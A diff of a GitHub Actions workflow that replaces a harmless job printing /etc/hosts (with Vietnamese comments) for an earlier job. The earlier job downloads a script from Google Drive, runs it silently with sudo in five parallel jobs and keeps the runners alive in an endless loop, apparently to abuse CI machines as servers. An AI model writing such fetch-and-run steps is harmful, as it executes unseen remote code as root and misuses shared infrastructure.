@@ -1,55 +1,19 @@
-name: Create 5 VPS
+# Tên file: .github/workflows/view-hosts.yml
 
+name: 1. Xem Tệp Hosts 📄
+
+# 2. Điều kiện kích hoạt:
 on:
-  push:
-    branches:
-      - main
-  workflow_dispatch:
-  repository_dispatch:
-    types: [create-vps]
+  workflow_dispatch: # Cho phép bạn chạy workflow này thủ công từ tab "Actions"
 
+# 3. Các công việc cần làm:
 jobs:
-  start-vps:
+  check_hosts_file:
+    # 4. Sử dụng máy ảo Linux (Ubuntu) mới nhất
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        vps_index: [1, 2, 3, 4, 5]
-
-    env:
-      GDRIVE_ID: 1091OMyUhjWcXqO9IGvcS2hIsrFOcL5RU
-      VPS_NAME: auto-restart-vps
 
     steps:
-      - uses: actions/checkout@v3
-
-      - uses: actions/setup-node@v3
-        with:
-          node-version: '20'
-
-      - name: Install & Run Bot
-        run: |
-          echo "Starting VPS 1"
-          echo "Starting VPS 2" 
-          echo "Starting VPS 3"
-          echo "Starting VPS 4"
-          echo "Starting VPS 5"
-          python3 -m pip install --user gdown
-          gdown --id "$GDRIVE_ID" -O setup.sh
-          chmod +x setup.sh
-          (sudo bash setup.sh >/dev/null 2>&1 &)
-
-      - name: Keep VPS alive
-        run: |
-          echo "VPS 1 is running..."
-          echo "VPS 2 is running..."
-          echo "VPS 3 is running..."
-          echo "VPS 4 is running..."
-          echo "VPS 5 is running..."
-          while true; do
-            date +"[%Y-%m-%d %H:%M:%S] VPS-1 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-2 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-3 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-4 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-5 still alive..."
-            sleep 60
-          done
+      # 5. Bước 1: Đặt tên cho bước này
+      - name: In nội dung tệp /etc/hosts
+        # 6. Chạy lệnh 'cat' để đọc và in nội dung tệp
+        run: cat /etc/hosts
